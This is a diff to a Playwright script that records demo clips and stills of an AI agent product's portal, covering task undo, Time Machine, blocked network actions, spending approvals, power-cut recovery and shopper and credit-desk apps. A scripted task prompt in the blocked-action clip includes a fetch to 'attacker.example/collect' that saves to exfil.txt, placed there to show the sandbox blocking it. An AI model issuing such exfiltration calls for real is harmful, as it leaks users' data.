@@ -91,7 +91,14 @@ async function finish(page, name) {
   if (v) { const src = await v.path(); fs.renameSync(src, `${OUT}/raw/${name}.webm`); console.log('raw', `${OUT}/raw/${name}.webm`); }
 }
 
-// --- clips -----------------------------------------------------------------------------------------------
+// --- clips (portal v2: top bar, dock, windows, Notification Center) ----------------------------------------
+
+const dock = (page, label) => page.locator(`.gos-dock-item[aria-label^="${label}"], .gos-dock-item[title^="${label}"]`).first();
+const banner = (page, text) => page.locator('.gos-banners .gos-note', { hasText: text }).first();
+const glide = async (page, loc, dx = 0.5, dy = 0.5, ms = 900) => {
+  const b = await loc.boundingBox({ timeout: 5000 }).catch(() => null);
+  if (b) await moveTo(page, b.x + b.width * dx, b.y + b.height * dy, ms);
+};
 
 const clips = {
   async 'moment-1-undo'(browser) {
@@ -101,30 +108,29 @@ const clips = {
     await until(async () => (await state(c.id)) === 'done');
     const page = await open(browser, 'moment-1-undo');
     await page.waitForTimeout(800);
-    await click(page, page.locator('.app-grid', { hasText: 'Tasks' }));
+    await click(page, dock(page, 'Tasks'));
     await page.waitForTimeout(1500);
-    await click(page, page.locator('.trow', { hasText: 'Clean up the notes folder' }));
-    await page.waitForTimeout(1800);
-    const files = await page.locator('.files').first().boundingBox();
-    if (files) await moveTo(page, files.x + files.width * 0.4, files.y + files.height / 2, 900);
-    await page.waitForTimeout(1600);
-    await click(page, page.locator('.task-actions').getByRole('button', { name: 'Undo this task' }));
-    await page.waitForTimeout(900);
-    await click(page, page.locator('.task-actions').getByRole('button', { name: 'Yes, undo it' }));
-    await page.locator('.task-undone').waitFor();
+    const row = page.locator('.g-tr', { hasText: 'Clean up the notes folder' });
+    await click(page, row);
+    await row.dblclick().catch(() => {});
+    await page.getByText('Files it changed').first().waitFor({ timeout: 5000 }).catch(() => page.evaluate((id) => (location.hash = `task/${id}`), c.id));
     await page.waitForTimeout(2000);
-    await click(page, page.locator('.window-close'));
-    await page.waitForTimeout(700);
-    await click(page, page.locator('.app-grid', { hasText: 'Time Machine' }));
+    await glide(page, page.getByText('Files it changed').first(), 0.5, 3);
+    await page.waitForTimeout(2000);
+    await click(page, page.getByRole('button', { name: 'Undo task', exact: true }).last());
     await page.waitForTimeout(1200);
-    const tab = page.locator('.tm .tab', { hasText: 'notes' });
-    if (await tab.count()) await click(page, tab);
+    await click(page, page.locator('dialog .g-alert-actions button').last());
+    await page.waitForTimeout(2500);
+    await click(page, dock(page, 'Time Machine'));
+    await page.waitForTimeout(1500);
+    const ws = page.locator('.g-sidebar-item', { hasText: 'notes' });
+    if (await ws.count()) await click(page, ws.first());
     await page.waitForTimeout(1200);
-    const layers = await page.locator('.layers').boundingBox();
-    if (layers) await moveTo(page, layers.x + layers.width * 0.5, layers.y + 30, 900);
+    await glide(page, page.locator('.gos-w-stack'), 0.5, 0.2);
     await page.waitForTimeout(1200);
-    const undone = await page.locator('.layer', { hasText: 'Clean up the notes folder' }).boundingBox();
-    if (undone) await moveTo(page, undone.x + undone.width - 40, undone.y + undone.height / 2, 700);
+    await glide(page, page.locator('.gos-w-layer', { hasText: 'Clean up the notes folder' }), 0.7, 0.5, 700);
+    await page.waitForTimeout(2000);
+    await glide(page, page.locator('.gos-w-layer', { hasText: 'Plan the Lisbon trip' }), 0.7, 0.5, 700);
     await page.waitForTimeout(3000);
     await finish(page, 'moment-1-undo');
   },
@@ -136,42 +142,35 @@ const clips = {
       title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
       prompt: 'fetch http://example.com/ page.html\nsleep 3\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.',
     });
-    const banner = page.locator('.banner', { hasText: /blocked/i }).first();
-    await banner.waitFor({ timeout: 30000 });
-    await page.waitForTimeout(1000);
-    const bb = await banner.boundingBox();
-    await moveTo(page, bb.x + bb.width * 0.5, bb.y + bb.height * 0.45, 900);
-    await page.waitForTimeout(2800);
-    await click(page, banner.getByText('Open the task'));
-    await page.waitForTimeout(1500);
-    const sum = await page.locator('.blocked-summary').boundingBox();
-    if (sum) await moveTo(page, sum.x + 300, sum.y + sum.height / 2, 900);
-    await page.waitForTimeout(3000);
-    const steps = await page.locator('.steps').boundingBox();
-    await moveTo(page, steps.x + 300, Math.min(steps.y + 100, 700), 600);
-    for (let i = 0; i < 6; i++) { await page.mouse.wheel(0, 70); await page.waitForTimeout(60); }
+    const n = banner(page, /blocked/i);
+    await n.waitFor({ timeout: 30000 });
     await page.waitForTimeout(800);
-    const row = await page.locator('.steps li', { hasText: 'Blocked' }).first().boundingBox();
-    if (row) await moveTo(page, row.x + 220, row.y + row.height / 2, 700);
+    await glide(page, n, 0.5, 0.45);
+    await page.waitForTimeout(2500);
+    await click(page, n.locator('.gos-two'));
+    await page.waitForTimeout(2000);
+    await glide(page, page.getByText(/not allowed to do/).first(), 0.4, 0.5);
+    await page.waitForTimeout(3000);
+    await glide(page, page.getByText(/^Blocked:/).first(), 0.4, 0.5, 800);
     await page.waitForTimeout(3500);
     await finish(page, 'moment-2-blocked');
   },
 
   async 'moment-3-approval'(browser) {
     const box = await open(browser, 'moment-3-box');
-    const phone = await open(browser, 'moment-3-phone', { viewport: PHONE, scale: 2 });
+    const phone = await open(browser, 'moment-3-phone', { viewport: PHONE, scale: 2, url: '/' });
     await box.waitForTimeout(1500);
     await task({
       title: 'Renew the domain', tools: ['example.spend'], budgetCents: 1000,
       prompt: 'call example.spend {"cents":1500,"on":"renewing the photo site domain for a year"}\nwrite renewed.txt Renewed until next October.',
     });
-    const approve = phone.locator('.banner').getByRole('button', { name: /^Approve/ }).first();
+    await banner(box, 'Renew the domain').waitFor({ timeout: 30000 });
+    const card = phone.locator('section, li, article, div').filter({ hasText: 'Renew the domain' }).filter({ has: phone.getByRole('button', { name: 'Approve' }) }).last();
+    const approve = card.getByRole('button', { name: 'Approve' }).first();
     await approve.waitFor({ timeout: 30000 });
-    await box.locator('.banner', { hasText: /wants your ok/i }).first().waitFor({ timeout: 15000 });
     await phone.waitForTimeout(3500);
     await click(phone, approve, { pause: 600 });
-    await box.locator('.banner', { hasText: /wants your ok/i }).waitFor({ state: 'detached', timeout: 15000 }).catch(() => {});
-    await box.waitForTimeout(4500);
+    await box.waitForTimeout(6000);
     fs.writeFileSync(`${OUT}/raw/moment-3-offsets.json`, JSON.stringify({ box: box.t0, phone: phone.t0 }));
     await finish(phone, 'moment-3-phone');
     await finish(box, 'moment-3-box');
@@ -182,19 +181,17 @@ const clips = {
     await task({ title: 'Count the photo albums', prompt: lines });
     await wait(2500);
     const page = await open(browser, 'moment-4-power-cut');
-    const run = await page.locator('.widget-running').boundingBox();
-    await moveTo(page, run.x + run.width / 2, run.y + run.height - 30, 900);
+    const run = page.locator('.gos-widget-card', { hasText: 'Running' });
+    await glide(page, run, 0.5, 0.7);
     await page.waitForTimeout(3500);
     execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
-    await page.getByText('out of reach').first().waitFor({ timeout: 20000 });
-    await page.waitForTimeout(5000);
+    await page.waitForTimeout(7000);
     execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
-    await page.getByText('Welcome back').first().waitFor({ timeout: 30000 });
+    await page.getByText('Welcome back').first().waitFor({ timeout: 40000 });
     await page.waitForTimeout(2500);
-    const banner = page.locator('.banner').first();
-    if (await banner.count()) { const bb = await banner.boundingBox(); await moveTo(page, bb.x + bb.width / 2, bb.y + bb.height / 2, 900); }
+    await glide(page, page.locator('.gos-desk-sub'), 0.5, 0.5);
     await page.waitForTimeout(3000);
-    await moveTo(page, run.x + run.width / 2, run.y + run.height - 30, 900);
+    await glide(page, run, 0.5, 0.7);
     await page.waitForTimeout(3500);
     await finish(page, 'moment-4-power-cut');
   },
@@ -204,88 +201,63 @@ const clips = {
     const w = await api('POST', '/t/shopper/watches', { store: 'test', product: 'HV60-100', maxCents: 700, qty: 2 });
     await wait(6000);
     const page = await open(browser, 'shopper', { url: '/screen#app/shopper/shopper' });
-    await page.waitForTimeout(1500);
-    const frame = page.frameLocator('.track-frame');
-    const watchRow = frame.getByText('Hario V60 02 paper filters').first();
-    await watchRow.scrollIntoViewIfNeeded().catch(() => {});
-    const wb = await page.locator('.track-frame').boundingBox();
-    await moveTo(page, wb.x + wb.width * 0.45, wb.y + wb.height * 0.55, 900);
+    await page.waitForTimeout(2000);
+    await glide(page, page.locator('.gos-track-frame'), 0.45, 0.55);
     await page.waitForTimeout(2500);
     await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 650 });
     await api('POST', '/t/shopper/watches/check', { id: w.id ?? w.watch?.id });
-    const banner = page.locator('.banner', { hasText: /wants your ok/i }).first();
-    await banner.waitFor({ timeout: 60000 });
+    const n = banner(page, /Hario|Buy/);
+    await n.waitFor({ timeout: 60000 });
     await page.waitForTimeout(3500);
-    await click(page, banner.getByRole('button', { name: /^Approve/ }), { pause: 700 });
+    await click(page, n.getByRole('button', { name: /^Approve/ }), { pause: 700 });
     await page.waitForTimeout(6000);
     await finish(page, 'shopper');
   },
+
+  async 'credit-desk'(browser) {
+    const page = await open(browser, 'credit-desk', { url: '/screen#app/credit-desk/credit-desk' });
+    await page.waitForTimeout(1500);
+    await api('POST', '/t/credit-desk/run', { case: 'fogline-2026-10', scripted: true });
+    const n = banner(page, /APP-1043|fraud/i);
+    await n.waitFor({ timeout: 60000 });
+    await page.waitForTimeout(1000);
+    await glide(page, n, 0.5, 0.45);
+    await page.waitForTimeout(4000);
+    await click(page, n.getByRole('button', { name: /^Approve/ }), { pause: 700 });
+    await page.waitForTimeout(2000);
+    // The rest of the controller's questions are answered off screen, so the run can finish and be scored.
+    for (const end = Date.now() + 60000; Date.now() < end; await wait(1000)) {
+      const pend = await api('GET', '/api/approvals?state=pending');
+      for (const a of pend) await api('POST', `/api/approvals/${encodeURIComponent(a.id)}`, { approved: true, by: 'controller' }).catch(() => {});
+      const runs = await api('GET', '/t/credit-desk/runs').catch(() => null);
+      const r = Array.isArray(runs) ? runs[0] : runs?.runs?.[0];
+      if (r && (r.seats ?? r.tasks ?? []).every((t) => ['done', 'failed'].includes(t.state))) { await api('POST', '/t/credit-desk/score', { run: r.run ?? r.id }).catch(() => {}); break; }
+    }
+    await page.evaluate(() => document.querySelector('.gos-track-frame')?.contentWindow?.location.reload());
+    await page.waitForTimeout(3000);
+    await glide(page, page.locator('.gos-track-frame'), 0.5, 0.35);
+    await page.waitForTimeout(2500);
+    await page.mouse.wheel(0, 500);
+    await page.waitForTimeout(3500);
+    await finish(page, 'credit-desk');
+  },
 };
 
-// Stills: one fresh box, every screen the site shows. Not a clip, so run it on its own: record.mjs stills
+// Stills of the track apps in v2's windows. Desktop, task and phone stills come from portal/screenshots/.
 clips.stills = async (browser) => {
-  const b = await task({ title: 'Plan the Lisbon trip', workspace: 'notes', prompt: 'write trip.md # Lisbon\nappend trip.md Flights booked for Nov 12.\nappend notes.md Lisbon trip planned.' });
-  await until(async () => (await state(b.id)) === 'done');
-  const c = await task({ title: 'Clean up the notes folder', workspace: 'notes', prompt: 'rm notes.md\nwrite cleanup.txt Removed 1 old file: notes.md' });
-  await until(async () => (await state(c.id)) === 'done');
-  await api('POST', `/api/tasks/${c.id}/undo`);
-  const bike = await task({ title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
-    prompt: 'fetch http://example.com/ page.html\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.' });
-  await until(async () => (await state(bike.id)) === 'done');
-  await task({ title: 'Deploy the new build', prompt: 'ask Deploy build 214 to the home server now?\nwrite deployed.txt yes' });
-  await wait(1000);
-  await task({ title: 'Renew the domain', tools: ['example.spend'], budgetCents: 1000,
-    prompt: 'call example.spend {"cents":1500,"on":"renewing the photo site domain for a year"}\nwrite renewed.txt Renewed until next October.' });
-  await wait(3000);
   const desk = await open(browser, null);
-  const shot = async (page, name, hash) => {
-    if (hash !== undefined) { await page.evaluate((h) => (location.hash = h), hash); await page.waitForTimeout(2500); }
-    await page.screenshot({ path: `${SHOTS}/${name}.png` });
+  await desk.evaluate(() => document.getElementById('__cursor')?.remove());
+  const shot = async (name, hash, ms = 3000) => {
+    await desk.evaluate((h) => (location.hash = h), hash);
+    await desk.waitForTimeout(ms);
+    await desk.screenshot({ path: `${SHOTS}/${name}.png` });
     console.log('shot', name);
   };
-  await desk.evaluate(() => document.getElementById('__cursor')?.remove());
-  await shot(desk, 'box-home');
-  // Window stills read better without the approval banner over them; the home and phone shots keep it.
-  await desk.locator('.banner-hide').evaluateAll((els) => els.forEach((e) => e.click()));
-  await desk.waitForTimeout(500);
-  await shot(desk, 'box-blocked', `#task/${bike.id}`);
-  await shot(desk, 'box-undone', `#task/${c.id}`);
-  await shot(desk, 'box-time-machine', '#time-machine');
-  await shot(desk, 'box-activity', '#activity');
-  await shot(desk, 'box-tasks', '#tasks');
-  await desk.evaluate(() => (location.hash = ''));
-  await desk.waitForTimeout(1500);
-  await desk.locator('.notif-button').click();
-  await desk.waitForTimeout(1500);
-  await shot(desk, 'box-notifications');
-  await desk.keyboard.press('Escape');
-  await shot(desk, 'app-shopper', '#app/shopper/shopper');
-  await shot(desk, 'app-store', '#app/shopper/store');
-  await desk.waitForTimeout(3000);
-  await shot(desk, 'app-wallet', '#app/wallet/wallet');
-  await desk.waitForTimeout(2500);
-  await shot(desk, 'app-wallet');
-  await shot(desk, 'box-pair', '#settings');
-  await desk.evaluate(() => (location.hash = ''));
-
-  const phone = await open(browser, null, { viewport: PHONE, scale: 2, url: '/' });
-  await phone.evaluate(() => document.getElementById('__cursor')?.remove());
-  await shot(phone, 'phone-approval');
-  await phone.locator('.banner-hide').first().click().catch(() => {});
-  await phone.locator('.banner-hide').first().click().catch(() => {});
-  await phone.waitForTimeout(800);
-  await shot(phone, 'phone-home');
-  await shot(phone, 'phone-tasks', '#tasks');
-  await phone.evaluate(() => (location.hash = ''));
-
-  execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
-  await wait(4000);
-  execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
-  await desk.getByText('Welcome back').first().waitFor({ timeout: 30000 });
-  await desk.waitForTimeout(3000);
-  await shot(desk, 'box-after-power-cut');
+  await shot('app-shopper', '#app/shopper/shopper');
+  await shot('app-store', '#app/shopper/store');
+  await shot('app-wallet', '#app/wallet/wallet', 6000);
+  await shot('app-credit-desk', '#app/credit-desk/credit-desk', 4000);
   await desk.context().close();
-  await phone.context().close();
 };
 
 const which = process.argv.slice(2);
